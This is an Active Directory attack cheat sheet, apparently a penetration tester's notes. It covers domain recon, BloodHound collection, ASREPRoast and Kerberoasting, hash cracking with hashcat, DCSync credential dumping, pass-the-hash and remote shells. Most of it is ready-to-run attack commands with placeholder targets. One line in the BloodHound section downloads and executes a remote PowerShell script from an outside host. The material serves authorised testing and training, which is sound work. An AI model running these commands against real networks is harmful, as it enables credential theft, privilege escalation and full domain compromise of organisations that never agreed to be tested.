# Intro
* Sources for this cheat sheet: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
* Good list of AD pentest commands and tools: https://wadcoms.github.io/
* Using impacket scripts input Domain Names in **lower case** if connection fails!
* Rubeus is to be used when remote access to some AD host avialable

# Reconaissance

Understanding the target AD environment is key to further exploitation.

* **Tools**:

* crackmapexec
* Rubeus
* `enum4linux -a target_ip > enum.log`

* AD recon: https://github.com/sense-of-security/ADRecon
* Bloodhound: https://github.com/BloodHoundAD/BloodHound
* targetedKerberoast: https://github.com/ShutdownRepo/targetedKerberoast


## Domain Controller Discovery
For more details see: https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/how-domain-controllers-are-located


* **Troubleshooting**: `nltest /dsgetdc:domain.local`
* **DNS query**: `nslookup -q=srv _ldap._tcp.dc._msdcs.domain.local`
* **Using nltest**: `nltest /dclist:domain.local`

## Domain Hosts Discovery

* NetBios scan: `nbtscan 192.168.100.0/24`
* LDAP query of domain base (credentials required): `ldapsearch -H ldap://dc.ip -x -LLL -W -D "anakin@contoso.local" -b "dc=contoso,dc=local" "(objectclass=computer)" "DNSHostName" "OperatingSystem" `
* NTLM info scirpt: `ntlm-info smb 192.168.100.0/24`
* Scan also for ports: 135(RPC) and 139(NetBIOS serssion service)

## Sniffing using Bloodhound

Actual collectors: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

1. Get Sharphound on target host to collect data for Bloodhound
`iex(new-object net.webclient).downloadstring("http://10.10.14.43/AzureHound.ps1")`

2. Invoke Bloodhound on target host and harvest data
`invoke-bloodhound -collectionmethod all -ZipFileName exf_blood -domain xxx.local -ldapuser xxxuserxxx -ldappass xxpasswordxxx`

OR

use Bloodhound.py (https://github.com/fox-it/BloodHound.py) to collect AD info:

`./bloodhound.py -d xxx.local -u xxxxxx -p xxx -gc xxx.xxx.local -c all -ns 10.10.10.xxx`

### Launching Bloodhound and AD Visualization

1. launch neo4j: `sudo neo4j console`
2. launch GUI: `bloodhound`
3. click on Upload Data in the upper right corner
4. Right-Click on free are on the screen and select "Reload Query"

# Exploitation

1. Try attacking Kerberos in this order:
Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/

* Kerberos brute-force
* ASREPRoast
* Kerberoasting
* Pass the key
* Pass the ticket
* Silver ticket
* Golden ticket

## Brute Force ASREP roast

* Sometimes remote access if possible if PREAUTH is misconfigure. Just try bruteforcing if
* Important: need list of valid users! Check users using: `kerbrute userenum ...`
* To get user list of users use: `enum4linux`

```

   1. Look for users via enum4linux
      
   2. Use ASREP roast against users in the ldapenum_asrep_users.txt file
    
	GetNPUsers.py xxx.com/xxx:xxx -usersfile usersall.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.11.1.xxx
	
	OR with Rubeus
	
	.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
   
   3. Use SPN roast against users in the ldapenum_spn_users.txt file
   
   Crack SPN roast and ASPREP roast output with hashcat
   
   hashcat -a 0 -m 18200 hc.txt  /usr/share/wordlists/rockyou.txt

```


## Remote Shell

* RPC: `evil-winrm -i 10.10.10.xxx -u 'xxx'  -p 'xxx' `
* SMB: use some exploit from SMB cheat sheet

## Dsync Attack
Read about dsync here: https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync

* Find accounts with permissions for DSync using **powerview**

```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}

```

* Dump Admin credentials with an account that has **permissions to do so**

`secretsdump.py xxx/usename@10.10.10.xxx -just-dc-user Administrator` 

* Use extracted hash to perform pass the hash attack

`psexec.py -hashes aad3b435b51404eeaad3b435b5140xxx:32693b11e6aa90eb43d32c72a07cxxxx "xxx.local/Administrator@10.10.10.xxx"`

## Kerberoasting

* Look for kerberoastable accounts:

`ldapsearch -H ldap://10.11.1.xxx -x -LLL -W -b "dc=xxx,dc=com" "(&(samAccountType=805306368)(servicePrincipalName=*))"`
 
* get TGSs for cracking 

```
GetUserSPNs.py xxx.com/xxx:xxx -outputfile hashes.kroast -dc-ip 10.11.1.xxx

OR Rubeus

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

```


* And finally, crack the hash
`hashcat -a -m 13100 SPN.hash /wordlists/rockyou.txt`

## Hash cracking

* in most cases pass the hash attack is better as it does not waste time

### MsCacheV2

`hashcat -m2100 '$DCC2$10240#spot#3407de6ff2f044ab21711a394d85fxxx' /usr/share/wordlists/rockyou.txt --force --potfile-disable`

# Lateral Movement

## In-Depth Discovery:

* **Manual information gathering on AD member **:  

Get Domain infos: <code> Get-ADDomain </code>

Get Forest infos: <code> Get-ADForest</code>

AD user info: <code> Get-ADUser Administrator </code>

Important AD users:  <code> Get-ADUser -Filter * | select SamAccountName </code>

Search for specific user: <code>  Get-ADUser -Filter 'UserPrincipalName -like "user*"' </code>

Get all Users (including Computernames): <code> Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select SamAccountName </code>

Groups:  <code> Get-ADGroup -Filter * | select SamAccountName </code> 

**AD Admins group**:  `Get-ADGroup "Domain Admins" -Properties members,memberof`

Check trusted domains: <code> nltest /domain_trusts </code>

* **Get current active domain for the user**:

<code> (Get-WmiObject Win32_ComputerSystem).Domain </code>

* **Domain can be also identified using** [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers):

<code> Get-ADDomain | select DNSRoot, NetBIOSName, DomainSID </code>


